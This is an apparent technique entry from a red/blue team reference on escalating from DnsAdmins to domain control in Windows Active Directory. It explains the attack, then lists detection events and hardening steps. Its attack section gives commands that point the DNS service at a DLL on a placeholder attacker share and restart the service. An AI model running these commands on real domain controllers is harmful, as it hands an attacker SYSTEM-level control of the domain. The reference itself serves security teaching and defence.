# [PE-VALID-003]: Unfiltered DNSAdmins Access

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-VALID-003 |
| **MITRE ATT&CK v18.1** | [Valid Accounts: Domain Accounts (T1078.002)](https://attack.mitre.org/techniques/T1078/002/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Windows AD |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Members of the `DnsAdmins` group can manage the DNS service running on Domain Controllers. While they are not Domain Admins, they can instruct the DNS server to load an arbitrary DLL (via the `ServerLevelPluginDll` registry key) to "extend" its functionality. Since the DNS service runs as **SYSTEM**, this DLL executes with full privileges on the Domain Controller.
- **Attack Surface:** DNS Management RPC.
- **Business Impact:** **Domain Compromise**. Elevation from DnsAdmin to Domain Admin.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Member of `DnsAdmins`.
- **Tools:**
    - [dnscmd](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd)
    - [Mimikatz](https://github.com/gentilkiwi/mimikatz)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Host Malicious DLL**
Create a DLL that adds a user to Domain Admins (e.g., using msfvenom). Host it on an SMB share.

**Step 2: Configure Plugin**
```cmd
dnscmd DC01 /config /serverlevelplugindll \\attacker\share\evil.dll
```

**Step 3: Restart Service**
```cmd
sc \\DC01 stop dns
sc \\DC01 start dns
```
*Note: If the user cannot restart the service, they must wait for a reboot or crash.*

## 5. DETECTION (Blue Team Operations)

#### 5.1 AD Logs
| Source | Event | Filter Logic |
|---|---|---|
| **System** | 770 | DNS Server plugin DLL loaded. |
| **Security** | 5136 | Registry Key Modified (if auditing active). Key: `HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters`. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Remove Members:** Empty the `DnsAdmins` group. Use standard Delegation wizards for DNS record management instead of the builtin group.
*   **Audit:** Monitor the `ServerLevelPluginDll` registry key.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-RECON-002]
> **Next Logical Step:** [CA-UNSC-001] (DCSync)
